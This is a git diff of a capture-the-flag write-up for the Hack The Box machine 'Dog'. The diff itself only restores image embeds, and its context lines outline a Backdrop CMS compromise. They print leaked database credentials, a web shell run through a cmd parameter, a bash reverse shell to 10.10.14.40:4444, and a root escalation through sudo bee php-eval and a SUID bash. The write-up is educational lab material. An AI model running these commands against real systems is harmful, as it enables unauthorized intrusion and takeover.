@@ -54,7 +54,6 @@ gradient: "from-purple-500 to-indigo-600"
     22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
     80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
     ```
-
     The scan reveals that ports 22 (SSH) and 80 (HTTP) are open. Port 80 is our primary target for web enumeration.
 
     <!-- Ensure this image line is NOT wrapped in any backticks (`) or triple backticks (```) -->
@@ -115,8 +114,8 @@ gradient: "from-purple-500 to-indigo-600"
 
     * **Username:** `root`
     * **Password:** `BackDropJ2024052824`
-<!-- image 4 
-    ![Code snippet of settings.php revealing database credentials](/cv-juan/images/dog-htb/settings-php.png "Database Credentials in settings.php") -->
+
+    ![Code snippet of settings.php revealing database credentials](/cv-juan/images/dog-htb/settings-php.png "Database Credentials in settings.php")
     *Caption: The `settings.php` file containing the cleartext database credentials.*
 
     ### Discovery of Username (tiffany@dog.htb)
@@ -138,8 +137,8 @@ gradient: "from-purple-500 to-indigo-600"
     **Access URL:** `http://10.10.11.58/user/login` (or similar)
 
     Authentication was successful, and we gained access to the Dashboard of Backdrop CMS.
-<!-- image 5
-    ![Backdrop CMS login page and dashboard after successful login](/cv-juan/images/dog-htb/backdrop-login-dashboard.png "Backdrop CMS Login and Dashboard") -->
+
+    ![Backdrop CMS login page and dashboard after successful login](/cv-juan/images/dog-htb/backdrop-login-dashboard.png "Backdrop CMS Login and Dashboard")
     *Caption: Successfully logged into the Backdrop CMS dashboard.*
 
     ---
@@ -201,8 +200,8 @@ gradient: "from-purple-500 to-indigo-600"
         * **URL:** `http://10.10.11.58/admin/modules/install` (or similar, in the `Configuration` -> `Install projects` menu).
         * We uploaded `shell.tar` via the "Upload a module, theme, or layout archive to install" option.
     3.  **Confirm Upload:** The CMS reported "Installation was completed successfully".
-<!-- image 5
-    ![Screenshot of Backdrop CMS module upload interface](/cv-juan/images/dog-htb/module-upload.png "Uploading the malicious module") -->
+
+    ![Screenshot of Backdrop CMS module upload interface](/cv-juan/images/dog-htb/module-upload.png "Uploading the malicious module")
     *Caption: The Backdrop CMS interface for uploading a new module/theme.*
 
     ### Locating the Uploaded Shell
@@ -220,8 +219,8 @@ gradient: "from-purple-500 to-indigo-600"
     We were able to execute commands via the `cmd` parameter, for example, `http://10.10.11.58/modules/shell/shell.php?cmd=whoami`.
 
     **Initial User:** `www-data`
-<!-- image 6
-    ![Screenshot of the web shell with command execution](/cv-juan/images/dog-htb/web-shell-rce.png "Web Shell Remote Code Execution") -->
+
+    ![Screenshot of the web shell with command execution](/cv-juan/images/dog-htb/web-shell-rce.png "Web Shell Remote Code Execution")
     *Caption: Executing commands via the uploaded web shell.*
 
     ### Establishing a Reverse Shell
@@ -252,8 +251,8 @@ gradient: "from-purple-500 to-indigo-600"
             ```bash
             bash -c "bash -i >& /dev/tcp/10.10.14.40/4444 0>&1"
             ```
-<!-- image 7 
-    ![Terminal screenshot showing Netcat listener receiving a reverse shell](/cv-juan/images/dog-htb/reverse-shell.png "Reverse Shell Connection") -->
+
+    ![Terminal screenshot showing Netcat listener receiving a reverse shell](/cv-juan/images/dog-htb/reverse-shell.png "Reverse Shell Connection")
     *Caption: Netcat listener successfully catching a reverse shell from the 'Dog' machine.*
 
     We received a `www-data` shell on our Netcat listener!
@@ -295,7 +294,9 @@ gradient: "from-purple-500 to-indigo-600"
 
     User johncusack may run the following commands on dog:
         (ALL : ALL) /usr/local/bin/bee
-    ```johncusack` can execute `/usr/local/bin/bee` as any user (ALL) and as root (ALL), without requiring an additional password if already authenticated as `johncusack`.
+    ```
+
+    `johncusack` can execute `/usr/local/bin/bee` as any user (ALL) and as root (ALL), without requiring an additional password if already authenticated as `johncusack`.
 
     The `bee` tool is an executable for Backdrop CMS that allows evaluating PHP code. We can use its `php-eval` subcommand to execute arbitrary PHP code as `root`.
 
@@ -305,8 +306,8 @@ gradient: "from-purple-500 to-indigo-600"
     ```
 
     Bingo! We have executed `whoami` as `root`.
-<!-- image 8 
-    ![Terminal screenshot showing sudo bee php-eval to execute whoami as root](/cv-juan/images/dog-htb/privesc-bee-whoami.png "Sudo Bee PHP Eval")-->
+
+    ![Terminal screenshot showing sudo bee php-eval to execute whoami as root](/cv-juan/images/dog-htb/privesc-bee-whoami.png "Sudo Bee PHP Eval")
     *Caption: Using `sudo bee` to execute `whoami` as the root user.*
 
     To get a persistent root shell, we can use `bee` to set the SUID bit on `/bin/bash`. The SUID bit allows an executable to run with the permissions of the file owner (in this case, `root`), instead of the user executing it.
@@ -326,8 +327,8 @@ gradient: "from-purple-500 to-indigo-600"
     bash-5.0# whoami
     root
     ```
-<!-- image 9
-    ![Terminal screenshot showing bash -p to become root](/cv-juan/images/dog-htb/root-shell.png "Root Shell") -->
+
+    ![Terminal screenshot showing bash -p to become root](/cv-juan/images/dog-htb/root-shell.png "Root Shell")
     *Caption: Obtaining a root shell using `bash -p` after setting the SUID bit.*
 
     We are root!
@@ -348,4 +349,3 @@ gradient: "from-purple-500 to-indigo-600"
     ---
     **Disclaimer:** This write-up is provided for educational and cybersecurity awareness purposes only. Any attempts to replicate these techniques on unauthorized systems are illegal and unethical. Perform penetration testing only in controlled environments and with proper permission.
     ---
-</article>
